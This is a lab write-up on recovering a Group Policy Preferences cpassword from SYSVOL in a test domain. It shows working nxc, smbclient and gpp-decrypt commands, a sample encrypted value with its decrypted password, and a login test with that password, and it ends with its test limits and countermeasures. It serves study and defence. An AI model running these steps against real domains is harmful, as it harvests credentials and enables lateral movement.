# GPP `cpassword` — Credential Recovery from SYSVOL

> Recovering a plaintext password stored in a Group Policy Preferences file, readable by any authenticated domain user.

---

## Overview

Group Policy Preferences (GPP) once allowed passwords to be stored in XML files distributed through **SYSVOL** (a share readable by every authenticated domain user). Those passwords were encrypted — but with an AES key **published by Microsoft and never changed**. Any domain user can therefore decrypt these values offline, with no special privilege.

| | |
|---|---|
| **Target** | SYSVOL on `DC-01` (`192.168.1.100`), domain `maquette.local` |
| **Objective** | Recover an account password stored in a group policy |
| **Reference** | Fixed by Microsoft in **MS14-025** (2014) — but pre-existing XML files remain exploitable if they were never cleaned up |

---

## Prerequisites

- An authenticated domain account, even unprivileged (standard SYSVOL read access)
- A GPP preference file still containing a `cpassword` attribute in SYSVOL
- `gpp-decrypt` (preinstalled on Kali)

---

## Exploitation

**1. Enumerate shares readable by a standard account:**

```bash
nxc smb 192.168.1.100 -u 'katrine.lion' -p 'passw0rd' --shares
```

SYSVOL and NETLOGON are readable — normal for any domain user.

**2. Retrieve the XML file containing the password:**

```bash
smbclient //192.168.1.100/SYSVOL -U 'MAQUETTE/katrine.lion'
# cd maquette.local/Policies/{GUID}/Machine/Preferences/Groups/
# get Groups.xml
```

The file's `cpassword` attribute holds the encrypted value.

**3. Decrypt offline, without touching the DC:**

```bash
gpp-decrypt 'H6p7O4+Prn73bf/sBIVXIwSlQMsPvD767ulReNYNa80='
```

---

## Proof

```bash
gpp-decrypt 'H6p7O4+Prn73bf/sBIVXIwSlQMsPvD767ulReNYNa80='
# → C0mptable2026!
```

Authentication confirmed with the recovered password:

```bash
nxc smb 192.168.1.100 -u 'gpp.labadmin' -p 'C0mptable2026!'
# [+] maquette.local\gpp.labadmin:C0mptable2026!
```

---

## Limits of this test

The `Groups.xml` file was created **manually** for the exercise, not through the GPMC interface (modern UIs removed this option after MS14-025, so building a genuine case through the UI is no longer possible — reproducing it by hand is the realistic equivalent). The tested account (`gpp.labadmin`) is a standard user with no access to `C$` or admin resources.

This test therefore does **not** claim to demonstrate escalation to Domain Admin. In the large majority of real cases, a GPP `cpassword` exposes a **local administrator password reused across several machines** (not a Domain Admin account), enabling lateral movement rather than a direct domain takeover. The real impact depends solely on the rights of the exposed account, not on the technique itself.

---

## Why it works

The flaw isn't the use of encryption as such — it's that the AES-256 key is **public and identical on every Windows installation**. Encrypting with a key everyone knows provides no confidentiality: anyone with access to the file can reverse it. Since SYSVOL is a network share normally readable by every authenticated user (by design, to distribute policies), any `cpassword` left in it is effectively a plaintext password.

---

## Countermeasures

- Search for and remove any remaining `cpassword` in SYSVOL
- Treat every recovered password as compromised and rotate it everywhere it's used
- Use **Windows LAPS** to manage local admin passwords instead of distributing them via GPP
- Use group Managed Service Accounts (**gMSA**) rather than static service passwords
- Restrict GPO modification rights to authorized administrators only
